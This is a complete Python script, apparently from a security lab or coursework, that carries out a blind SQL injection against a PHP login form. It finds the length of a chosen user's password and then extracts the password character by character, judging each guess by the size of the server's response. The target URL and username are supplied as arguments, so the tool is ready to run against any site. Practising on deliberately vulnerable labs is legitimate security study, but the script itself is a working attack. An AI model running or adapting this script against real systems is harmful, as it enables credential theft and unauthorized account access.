#!/usr/bin/python3
import requests
import argparse

# Questo script unisce il "Password Length Finder" e il "Blind Bruteforce" del tuo compagno

alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?/`~"
matched_lengths = []

parser = argparse.ArgumentParser("Blind SQLi Length & Password Extractor")
parser.add_argument("-v", "--verbose", help="Increase output verbosity", action="store_true")
parser.add_argument("-U", "--url", type=str, required=True, help="URL of the login page")
parser.add_argument("-u", "--username", type=str, required=True, help="Username to test against")
parser.add_argument("-m", "--max-length", type=int, default=50, help="Max password length to try")
args = parser.parse_args()

url = args.url
username = args.username
max_length = args.max_length
verbose = args.verbose

def post_payload(payload_username):
    data = {
        'username': payload_username,
        'password': '',
        'login-php-submit-button': 'Login'
    }
    return requests.post(url, data=data)

# 1) Determino la baseline (caso sempre falso)
baseline_payload = f"' OR (username='{username}' AND LENGTH(password)=0) #"
resp = post_payload(baseline_payload)
wrong_response_length = len(resp.text)
if verbose:
    print(f"[*] Baseline response length = {wrong_response_length}\n")

# 2) Trovo tutte le possibili lunghezze
for length in range(1, max_length + 1):
    test_payload = f"' OR (username='{username}' AND LENGTH(password)={length}) #"
    if verbose:
        print(f"Trying length: {length}")
    r = post_payload(test_payload)
    if len(r.text) != wrong_response_length:
        matched_lengths.append(length)
        print(f"Password of length {length} matched!")
        if len(matched_lengths) > 1:
            print(f"Oh god oh fuck, we have {len(matched_lengths)} {username}s")

if not matched_lengths:
    print("Nothing Found: nessuna lunghezza corrisponde.")
    exit(1)
else:
    print(f"Possible password lengths for '{username}': {matched_lengths}\n")

# 3) Per ogni lunghezza trovata, estraggo il valore carattere per carattere
for password_length in matched_lengths:
    print(f"[*] Estraggo password di lunghezza {password_length} per '{username}'...")
    matched_characters = [''] * password_length
    for i in range(password_length):
        for letter in alphabet:
            matched_characters[i] = letter
            prefix = ''.join(matched_characters)
            payload = (
                f"{username}' AND (SUBSTRING((SELECT password FROM accounts "
                f"WHERE username='{username}' AND LENGTH(password)={password_length} LIMIT 1), "
                f"1, {i+1}) = '{prefix}') #"
            )
            if verbose:
                print(f"Trying prefix: {prefix}")
            r = post_payload(payload)
            if len(r.text) != wrong_response_length:
                print(f"Actually matched prefix: {prefix}")
                break
    password = ''.join(matched_characters)
    print(f"Password for '{username}' (len={password_length}): {password}\n")